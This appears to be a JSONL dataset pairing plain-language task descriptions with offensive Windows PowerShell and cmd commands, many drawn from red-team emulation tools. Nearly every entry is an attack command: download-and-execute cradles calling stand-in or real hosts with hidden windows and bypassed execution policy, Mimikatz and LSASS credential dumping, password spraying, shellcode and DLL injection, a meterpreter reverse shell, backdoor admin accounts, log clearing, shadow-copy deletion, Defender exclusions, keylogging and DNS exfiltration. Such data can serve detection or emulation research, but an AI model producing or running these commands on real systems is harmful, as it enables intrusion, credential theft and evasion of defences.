{"input": "Run NBTSTAT to get NetBIOS information for a specified remote host IP.", "output": "nbtstat -A ${remote.host.ip}"}
{"input": "Copy Sandcat executable to a specified drive on a remote host.", "output": "$path = \"sandcat.go-windows\"; ; $drive = \"\\\\${Rem.Host.Fqdn}\\C$\"; ; Copy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";"}
{"input": "Invoke Expression to download and execute a script from a dangerous domain.", "output": "Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://dangerousdomain.com/KernDLL.ps1\")'"}
{"input": "Start PowerShell and run a script with specified arguments to emulate administrator tasks.", "output": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\""}
{"input": "Invoke PsExec to run a command on a remote computer with specified options.", "output": "Invoke-PsExec -ComputerName 192.168.50.200 -Command 'dir C:\\' -ServiceName Updater32 -ResultFile 'results.txt'"}
{"input": "Download and execute a script from a malicious website with hidden execution.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/Kwernel.ps1')\""}
{"input": "Run CMD to execute Netcat with specified options.", "output": "cmd /c ${ncat_exe} ${server_ip} ${server_port}"}
{"input": "Output ATHER command line parameters with specified options.", "output": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ${CommandLine} -CommandParamVariation ${CommandParam} -Execute -ErrorAction Stop"}
{"input": "Get credentials from Credential Manager and select the Target property.", "output": "Get-CredentialManager | Select-Object -Property Target"}
{"input": "Run a PowerShell script with specified options.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -File malicious_script.ps1"}
{"input": "Create a new item property in the registry with specified options.", "output": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services ; TDS -Name LsaDbExtPt -Value \"${dll_path}\""}
{"input": "Invoke a potentially malicious script block on a remote computer.", "output": "Invoke-Command -ComputerName <Remote Computer Name> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evilurl.com/') }"}
{"input": "Invoke SMBExec to run a command on a remote system with specified options.", "output": "Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'command or launcher to execute' -verbose"}
{"input": "Download and execute malware from a specified website using PowerShell with hidden execution.", "output": "powershell.exe -NoP -sta -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://website.com/malware')"}
{"input": "Search for hidden directories with \".git\" attribute in C:\\Users and retrieve the parent directory's full path.", "output": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;"}
{"input": "Perform a domain password spray attack using usernames as passwords and save valid credentials to a file.", "output": "Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt"}
{"input": "Invoke ATHER with specified options for compiled help.", "output": "Invoke-ATHCompiledHelp -ScriptEngine ${script_engine} -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}"}
{"input": "Invoke Mimikatz to dump certificates.", "output": "Invoke-Mimikatz -DumpCerts"}
{"input": "Resolve the path for createdump.exe and create a dump of lsass process with specified options.", "output": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\" ; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id"}
{"input": "Run a PowerShell script with specified options and hide the window.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File malicious_script.ps1"}
{"input": "Invoke a potentially malicious command on a target computer.", "output": "Invoke-Command -ComputerName [TARGET_IP] -ScriptBlock {[BAD_COMMAND]}"}
{"input": "Download and execute code from a malicious website with specified PowerShell options.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://malicious_site.com/)\""}
{"input": "Invoke a command on a target computer with a potentially malicious encoded command.", "output": "Invoke-Command -ComputerName <target> -ScriptBlock { Start-Process powershell.exe -ArgumentList '-NoP -NonI -W Hidden -Enc <encoded_command>' }"}
{"input": "Invoke Mimikatz to perform credential extraction with specified PowerShell options.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-Mimikatz\""}
{"input": "Invoke ATHER with specified options to create an HTML Application (HTA).", "output": "Invoke-ATHHTMLApplication -HTAUri ${hta_uri} -MSHTAFilePath ${mshta_file_path}"}
{"input": "Run a command with specified parameters and output the result to a file.", "output": "${mwc_path}\\${mwc_name} \"${XML_Payload}\" output.txt"}
{"input": "Invoke token manipulation on the wininit process to impersonate a user.", "output": "Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser"}
{"input": "Download and execute a script from a specified website with hidden execution using PowerShell.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')\""}
{"input": "Invoke a web request to download a file from a specified URL and save it to a local file.", "output": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile ${OutputFILE}"}
{"input": "Invoke a web request to a potentially malicious website with specified PowerShell options.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://thr3atSystem.com'\""}
{"input": "Get Active Directory objects using a specified LDAP filter and server.", "output": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uac_prop})' -Server ${domain}"}
{"input": "Download and execute a script from a malicious URL using PowerShell.", "output": "powershell.exe -command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.url/evilCode.ps1')\""}
{"input": "Invoke Inveigh with specified options to craft an HTTP response.", "output": "Invoke-Inveigh -HTTPResponse \"<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>\""}
{"input": "Create a new item property in the Windows Registry with specified options.", "output": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\""}
{"input": "Map a network drive using specified domain credentials.", "output": "net use \\\\${remote.host.fqdn}\\C$ /user:${dom.user.name} ${dom.user.pwd}"}
{"input": "Download and execute a PowerShell script from a remote server using Invoke-Command.", "output": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\"}"}
{"input": "Retrieve Group Policy Objects (GPOs) in the specified domain and append the results to a file.", "output": "Get-GPO -Domain $ENV:userdnsdomain ${gpo_param} >> ${gpo_output}"}
{"input": "Execute a malicious PowerShell script located at C:\\malicious_script.ps1 with bypassing execution policy and without loading user profiles.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\\malicious_script.ps1"}
{"input": "Run a batch file (Psiphon.bat) located at the specified path.", "output": "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat"}
{"input": "Rename mission.go to mission.exe and then execute it with specific parameters.", "output": "mv mission.go mission.exe;.\\mission.exe -duration 30 -extension .caldera -dir 'C:\\'"}
{"input": "Start a new process on the remote machine specified by ${RemotePcPath}.", "output": "Start-Process ${RemotePcPath}"}
{"input": "Perform a domain search in the specified LDAP search base.", "output": "Get-DomainSearcher -SearchBase LDAP://OU=secret,DC=testlab,DC=local"}
{"input": "Invoke ATHHTMLApplication with specified parameters.", "output": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath ${mshta_file_path}"}
{"input": "Invoke Boolang with the specified NapoliSource parameter.", "output": "Invoke-Boolang -NapoliSource 'aW1wb3J0IFN5c3RlbQ0KDQpwdWJsaWMgc3RhdGljIGRlZiBNYWluKCk6DQogICAgcHJpbnQgIkhlbGxvIGZyb20gQm9vTGFuZyEi'"}
{"input": "Download and execute a potentially malicious PowerShell script from a remote server using PowerShell.exe.", "output": "powershell.exe -exec bypass -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/Win32.ps1')\""}
{"input": "Download content from the specified URL into ${Output_File} and open it using Invoke-Item.", "output": "(New-Object Net.WebClient).DownloadString('${TRF}') | Out-File ${Output_File}; Invoke-Item ${Output_File}"}
{"input": "Download and execute a malicious PowerShell script from a remote server.", "output": "powershell.exe -windowstyle hidden -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/heavy32.ps1')\""}
{"input": "Retrieve and format information about recorded TV items using PowerShell.", "output": "Get-IndexedItem -Filter \"system.kind = 'recordedTV'\" -order 'System.RecordedTV.RecordingTime' -path '\\Cloud-engine\\Alice' -recurse | format-list path,title,episodeName,programDescription"}
{"input": "Download and execute a script from a shortened URL using PowerShell.", "output": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")"}
{"input": "Download and execute a malicious script with Bypass execution policy in PowerShell.", "output": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://malicious.site/malware/kernFl.ps1')\""}
{"input": "Map a network drive using specified credentials.", "output": "net use \\\\${remote.host.ip}\\c$ /user:${domain.user.name} ${domain.user.password};"}
{"input": "Disable HTTP logging for a specified website in IIS using PowerShell.", "output": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\${website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true"}
{"input": "Configure and execute a command in the Atomic Red Team framework using PowerShell.", "output": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ${command_line_switch_type} -CommandParamVariation ${command_param_variation} -Execute -ErrorAction Stop"}
{"input": "Download and execute a malicious PowerShell script from a remote server.", "output": "powershell.exe -nop -ep bypass -c {IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')}"}
{"input": "Ping a remote host using the Windows command prompt.", "output": "ping ${remote.host.fqdn}"}
{"input": "Invoke a command on a remote computer to download and execute a malicious PowerShell script.", "output": "Invoke-Command -ComputerName <Name> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://hacker.com/malware/bad.ps1')}"}
{"input": "Execute a PowerShell script to log keystrokes with specified parameters.", "output": "$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath ${filepath}"}
{"input": "Delete all Volume Shadow Copies using PowerShell.", "output": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"}
{"input": "Set a registry value using PowerShell.", "output": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"}
{"input": "Copy files with specified filtering criteria using PowerShell.", "output": "Copy-Item ${host.file.path[filters(technique=T1005,max=5)]} ${host.dir.staged[filters(max=2)]}"}
{"input": "Start a process with the specified path using PowerShell.", "output": "Start-Process ${AA_Path}"}
{"input": "Download and execute a malicious PowerShell script from a remote server.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://malicious-website.com/evil_script.ps1')"}
{"input": "Start recording from the webcam using PowerShell.", "output": "Start-WebcamRecorder"}
{"input": "Download and execute a malicious PowerShell script with Bypass execution policy.", "output": "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://evil-website.com/evilWin.ps1')\""}
{"input": "Read content from a file and send it as a POST request to a specified IP address using PowerShell.", "output": "$content = Get-Content ${InputFile} ; Invoke-WebRequest -Uri ${Ip_Address} -Method POST -Body $content"}
{"input": "Copy a file, start a process with it, retrieve the process ID, and stop the process using PowerShell.", "output": "copy ${input_file} ${output_file} ; $my_technique = (Start-Process -PassThru -FilePath ${output_file}).Id ; Stop-Process -ID $technique"}
{"input": "Create a new registry item to disable Command Prompt using PowerShell.", "output": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1"}
{"input": "Check for virtualization environment and print a message if detected using PowerShell.", "output": "$error.clear() ; Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue ; if($error) {echo \"Virtualization Environment detected\"}"}
{"input": "Execute a command with Tater to add a user and add it to the administrators group using PowerShell.", "output": "Invoke-Tater -Command 'net user Tater Spring2016 /add && net localgroup administrators Tater /add'"}
{"input": "Invoke shellcode in a specified process ID using PowerShell.", "output": "Invoke-Shellcode -ProcessId 13723"}
{"input": "Execute a Boolang script using PowerShell.", "output": "Invoke-Boolang -BooSource 'aW1wb3J0IFN5c3RlbQ0KDQpwdWJsaWMgc3RhdGljIGRlZiBNYWluKCk6DQogICAgcHJpbnQgIkhlbGxvIGZyb20gQm9vTGFuZyEi'"}
{"input": "Execute the Nightmare payload using PowerShell.", "output": "Invoke-Nightmare"}
{"input": "Inject a DLL into a running process and make a web request using PowerShell.", "output": "mavinject $pid /INJECTRUNNING ${file_name} ; Invoke-WebRequest ${server_name} -UseBasicParsing"}
{"input": "Invoke a command on a remote computer using PowerShell.", "output": "Invoke-Command -ComputerName <target_host> -ScriptBlock { < code > }"}
{"input": "Run PowerShell to execute the Calculator application with elevated privileges.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command Start-Process -FilePath C:\\Windows\\System32\\calc.exe -Verb RunAs"}
{"input": "Run PowerShell to execute Mimikatz and dump credentials.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Update the LastWriteTime of files in a specified path using PowerShell.", "output": "Get-ChildItem ${File_Path} | % { $_.LastWriteTime = \"${Date_time}\" }"}
{"input": "Execute PsExec on a remote computer with specific service parameters.", "output": "Invoke-PsExec -ComputerName 192.168.50.200 -ServiceName Updater32 -ServiceEXE 'service.exe'"}
{"input": "Update the LastAccessTime of files in a specified path using PowerShell.", "output": "Get-ChildItem ${filePath} | % { $_.LastAccessTime = \"${targetTime}\" }"}
{"input": "Purge Kerberos tickets and run Kerberoasting using cmd.exe and PowerShell.", "output": "klist purge ; cmd.exe /c \"${local_f}\\${local_exec}\" kerberoast ${flags} /outfile:\"${local_f}\\${outFile}\""}
{"input": "Set PowerShell Readline options to save nothing in history.", "output": "Set-PSReadlineOption -HistorySaveStyle SaveNothing"}
{"input": "Run PowerShell to execute Mimikatz and dump credentials.", "output": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Exploit Jenkins with a specified command and target using PowerShell.", "output": "Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'whoami'"}
{"input": "Reference a specific file path in the Atomic Red Team framework.", "output": "PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_tec_remote.html"}
{"input": "Download and execute a malicious PowerShell script from a remote server.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-code.ps1')\""}
{"input": "Change directory to the temp folder and run Kerbrute to perform a password spray attack using PowerShell.", "output": "cd $env:temp ; .\\kerbrute.exe passwordspray --dc ${domaincontroller} -d ${domain} $env:temp\\passwordspray.txt password132"}
{"input": "Invoke RID Hijacking with specific user, RID, password, and enable parameters using PowerShell.", "output": "Invoke-RIDHijacking -User Paul -RID 1002 -Password Password6 -Enable"}
{"input": "Invoke a command on a remote computer with a specified malicious command using PowerShell.", "output": "Invoke-Command -ComputerName <Target_Computer> -ScriptBlock { <Malicious_Command> }"}
{"input": "Retrieve browser history information for a specified user and browser using PowerShell.", "output": "Get-BrowserInformation -Browser All -Datatype History -UserName Alice -Search 'twitter'"}
{"input": "Set environment variables and run PowerShell with a delay using the Start-Sleep cmdlet.", "output": "$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${clsid_guid}' ; $env:COR_PROFILER_PATH = '${file_name}' ; POWERSHELL -c 'Start-Sleep 1'"}
{"input": "Copy a file from a network share to a local destination using PowerShell.", "output": "$source = \"\\\\server\\share\\sospicious_file.exe\" ;$destination = \"C:\\sospicious_file.exe\" ;Copy-Item -Path $source -Destination $dest"}
{"input": "Invoke a script block that retrieves process information and writes it to a file using PowerShell.", "output": "Invoke-Expression -Command {& {Get-Process | Out-File c:\\temp\\process.txt}}"}
{"input": "Invoke NetRipper with specific logging, process name, and verbose parameters using PowerShell.", "output": "Invoke-NetRipper -LogLocation 'C:\\Temp\\' -ProcessName 'putty' -Verbose"}
{"input": "Define a syntax list, iterate through it, and execute SharpView with each syntax using PowerShell.", "output": "$syntaxList = ${syntax} ; foreach ($syntax in $syntaxList) { ; ${SharpView} $syntax -}"}
{"input": "Change location to a specified path and run accesschk.exe with specific parameters using PowerShell.", "output": "Set-Location -path \"${file_path}\\Sysinternals\"; ; ./accesschk.exe -accepteula .;"}
{"input": "Run a VBScript using the Windows Script Host and redirect output to a file using PowerShell.", "output": "cscript ${vbscript} > $env:TEMP\\T1059.005.out.txt"}
{"input": "Invoke Token Manipulation to display all available tokens using PowerShell.", "output": "Invoke-TokenManipulation -ShowAll"}
{"input": "Download and execute a malicious PowerShell script from a remote server.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://heavy_site.com/evilKern.ps1')"}
{"input": "Run rundll32.exe with a specified input file and entry point using PowerShell.", "output": "rundll32.exe ${input_file}, StartW"}
{"input": "Run a PowerShell script with Bypass execution policy using PowerShell.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File sospiciousscript.ps1"}
{"input": "Download a file from a remote server using PowerShell.", "output": "(New-Object System.Net.WebClient).DownloadFile(\"${RemoteFile}\", \"${destinationPath}\")"}
{"input": "Invoke a command to retrieve process information and save it to a file using PowerShell.", "output": "Invoke-Expression -Command \"Get-Process | Out-File -Encoding ASCII C:\\malicious.txt\""}
{"input": "Download and execute a malicious PowerShell script from a remote server with a hidden window.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://maliciousweb.com')\""}
{"input": "Run Nmap to perform network scanning on a specified host using PowerShell.", "output": "nmap ${host_to_scan}"}
{"input": "Download and execute a malicious PowerShell script from a dangerous URL.", "output": "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://dangerous.url')\""}
{"input": "Invoke a script block using PowerShell.", "output": "Invoke-Expression -Command \"& { [Script Block] }\""}
{"input": "Add a port proxy using netsh to forward traffic from one port to another using PowerShell.", "output": "netsh interface portproxy add v4tov4 listenport=${ListenPort} connectport=${ConnectPort} connectaddress=${ConnectAddress}"}
{"input": "Invoke Shellcode with specified shellcode bytes using PowerShell.", "output": "Invoke-Shellcode -Shellcode @(0xC7,0xE9)"}
{"input": "Define an excluded process and add it to Windows Defender preferences using PowerShell.", "output": "$excludedProcess = \"${excluded_process}\" ; Add-MpPreference -ExclusionProcess $excludedProcess"}
{"input": "Download and execute a malicious PowerShell script from a remote server with Bypass execution policy.", "output": "powershell.exe -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evilsurl.com/threat/kern123.ps1')\""}
{"input": "Run a PowerShell script with Bypass execution policy from a local file.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File <bad_script>.ps1"}
{"input": "Enable PowerShell remoting and run a command on the local computer using PowerShell.", "output": "Enable-PSRemoting -Force ; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"}
{"input": "Get the explorer process, retrieve its ID, and inject a DLL into it using PowerShell.", "output": "$explorer = Get-Process -Name explorer; ; mavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll"}
{"input": "Copy pictures related to 'Stingray' and 'portfolio' to a specified destination using PowerShell.", "output": "Get-IndexedItem Stingray, kind=picture, keyword=portfolio | copy -destination e:\\"}
{"input": "Invoke Atomic Red Team's Compiled Help Module with specified HH and CHM file paths using PowerShell.", "output": "Invoke-ATHCompiledHelp -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}"}
{"input": "List all items with the name \"Bookmarks\" in the \"C:\\Users\\\" directory and its subdirectories, ignoring errors and forcing the operation.", "output": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force"}
{"input": "Download a payload from a specified URL and execute it using PowerShell.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://source.com/payload.exe'); Start-Process payload.exe;"}
{"input": "Rename a binary file, execute it with an XML payload, and redirect the output to a text file.", "output": "${renamed_binary} ${xml_payload} output.txt"}
{"input": "Rename a file and execute it with specific parameters using PowerShell.", "output": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\'"}
{"input": "Invoke Inveigh Relay to perform user and group manipulation on a specified target.", "output": "Invoke-InveighRelay -Target 192.168.2.55 -Command 'net user Inveigh Spring2017 /add && net localgroup administrators Inveigh /add'"}
{"input": "Invoke a command on a remote host to download and execute a script from a malicious site using PowerShell.", "output": "Invoke-Command -ComputerName <remote_host> -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://evil_site.example.com')}"}
{"input": "Invoke shellcode using PowerShell.", "output": "Invoke-Shellcode"}
{"input": "Invoke a command with heavy code on a specified remote target using PowerShell.", "output": "Invoke-Command -ComputerName <TargetName> -ScriptBlock {<heavy code>}"}
{"input": "Download and execute a malicious PowerShell script from a hidden window with Bypass execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evilwebsite.com')\""}
{"input": "Download and execute a script from a GitHub repository using PowerShell.", "output": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"}
{"input": "Add a registry entry to disable Hypervisor Enforced Code Integrity using the Windows Registry.", "output": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f"}
{"input": "Monitor clipboard activity with a collection limit of 120 entries.", "output": "Invoke-ClipboardMonitor -CollectionLimit 120"}
{"input": "Download and execute a PowerShell script from a remote server.", "output": "powershell.exe -exec bypass -Command \"Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('http://evil-axample.com/heavypayload')\""}
{"input": "Start a hidden PowerShell process and load a specific assembly.", "output": "$process = Start-Process -FilePath powershell.exe -ArgumentList '-nop', '-w', 'hidden', '-e', '[System.Reflection.Assembly]::LoadWithPartialName(\"AssemblyName\")'"}
{"input": "Remove a folder and its contents.", "output": "Remove-Item -Path ${folder_to_delete} -Recurse"}
{"input": "Inject and execute shellcode in a specified process with ID 4274.", "output": "Invoke-Shellcode -ProcessId 4274"}
{"input": "Inject a malicious DLL into a process with ID 1926.", "output": "Invoke-DllInjection -ProcessID 1926 -Dll malicoius.dll"}
{"input": "Download a file from a remote server using PowerShell.", "output": "(New-Object System.Net.WebClient).DownloadFile(\"${remote_file}\", \"${destination_path}\")"}
{"input": "Download and execute a PowerShell script from a specified URL.", "output": "$url = \"http://ghithub.com/badProject.ps1\"; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)"}
{"input": "Execute a VBScript using cscript.", "output": "cscript ${vbscript}"}
{"input": "Download and execute a PowerShell script from a remote server using the -c flag.", "output": "powershell -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script.ps1')\""}
{"input": "Clear the Security and System event logs.", "output": "Clear-Eventlog Security; ; Clear-Eventlog System;"}
{"input": "Create a notepad process, inject context, wait for 5 seconds, and then stop the notepad process.", "output": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe ; Start-Sleep -Seconds 5 ; Stop-Process $notepad.id"}
{"input": "Compress the contents of a directory into an archive file.", "output": "dir ${input_file} -Recurse | Compress-Archive -DestinationPath ${output_file}"}
{"input": "Start recording the webcam for 10 seconds and save the output to 'C:\\webcam.avi'.", "output": "Start-WebcamRecorder -RecordTime 10 -OutPath 'C:\\webcam.avi'"}
{"input": "Execute malicious code on a remote host using PowerShell.", "output": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { <malicious_code> }"}
{"input": "Perform RID Hijacking with specified RID, password, and using the host account.", "output": "Invoke-RIDHijacking -UseHost -RID 1001 -Password Password1"}
{"input": "Execute Backstab64.exe with specific parameters.", "output": "& $env:temp\\Backstab64.exe -k -n ${ProcessName}"}
{"input": "Manipulate tokens to create a new process (cmd.exe) with ProcessId 500.", "output": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessId 500"}
{"input": "Invoke Mimikatz to dump credentials and then execute shellcode with a reverse TCP payload.", "output": "Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443 -Force"}
{"input": "Run malicious code on a specified remote target using PowerShell.", "output": "Invoke-Command -ComputerName <target> -ScriptBlock { <malicious code > }"}
{"input": "Download and execute a PowerShell script on a remote host.", "output": "Invoke-Command -ComputerName <remote_host> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://exploit.com/hack_script.ps1')}"}
{"input": "Retrieve information about Internet Explorer bookmarks for user2.", "output": "Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user2"}
{"input": "Execute arbitrary PowerShell commands on a remote computer.", "output": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {<PowerShell commands>}"}
{"input": "Download and execute a malicious PowerShell script from a specific domain.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/your_malicious_script.ps1')\""}
{"input": "Create a minidump of the Chrome process.", "output": "Get-Process chrome | Out-Minidump"}
{"input": "Invoke DCOM to execute Excel DDE (Dynamic Data Exchange) method with the command 'calc.exe'.", "output": "Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command 'calc.exe'"}
{"input": "Execute a malicious command on a remote system using PowerShell.", "output": "Invoke-Command -ComputerName [Remote System] -ScriptBlock {[Malicious Command]}"}
{"input": "Execute an encrypted PowerShell command with specific options.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <encrypted_powershell_code>"}
{"input": "Add a certificate from a Personal Information Exchange (PFX) file to the certificate store.", "output": "certutil -addstore my ${PFX_path}"}
{"input": "Query information about imaging devices using CIM.", "output": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\""}
{"input": "Change directory to temp and execute Kerbrute to perform a password spray attack against a domain controller.", "output": "cd $env:temp ; .\\kerbrute.exe passwordspray --dc ${DomainController} -d ${Domain} $env:temp\\PasswordSpray.txt password456"}
{"input": "Download a file from a remote server using a .NET WebClient.", "output": "$Download = New-Object System.Net.WebClient; $Download.DownloadFile('http://malicious_site.com/malicious.ps1')"}
{"input": "Start a new PowerShell process with specific arguments, including an encoded command.", "output": "Start-Process -FilePath \"powershell.exe\" -ArgumentList '-NoP -sta -w 1 -enc [encoded command]'"}
{"input": "Perform reflective DLL injection with specified PE bytes, executable arguments, and process ID.", "output": "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $ExeArgs -ProcessID $ProcessID"}
{"input": "Send an email with specified parameters, including attachments.", "output": "Send-MailMessage -From ${sender_user} -To ${receiver_user} -Subject \"T1048.003 Atomic Test\" -Attachments ${inputF} -SmtpServer ${SMTPsrv}"}
{"input": "Import a PowerShell module and use DNS exfiltration with specified parameters.", "output": "Import-Module ${PSmodule} ; Invoke-DNSExfiltrator -i ${PSmodule} -d ${Domain} -p ${pwd} -doh ${DOH} -t ${Time} ${Encoding}"}
{"input": "Invoke Mimikatz to dump credentials on multiple specified computers.", "output": "Invoke-Mimikatz -DumpCreds -ComputerName @(computer1, computer2,computer3)"}
{"input": "Retrieve and display ACL information for registry services.", "output": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services* |FL ; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services${weak_service_name} |FL"}
{"input": "Download and execute a PowerShell script from a remote server on a specified target.", "output": "Invoke-Command -ComputerName [target] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://[malicious_url]')}"}
{"input": "Download and execute a PowerShell script on a specified target host.", "output": "Invoke-Command -ComputerName TargetHost -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/sysRoot.ps1') }"}
{"input": "Execute a PowerShell script from a specific file path.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\\Scripts\\sys64.ps1"}
{"input": "Copy a file from a remote location to the local temporary folder.", "output": "copy-item -Path \"\\${remote}\\C$${ShareFile}\" -Destination \"$Env:TEMP${LocalFile}\""}
{"input": "Start a new process under a specific parent process with specified ParentId and TestGuid.", "output": "Start-ATHProcessUnderSpecificParent -ParentId ${parent_pid} -TestGuid ${test_guid}"}
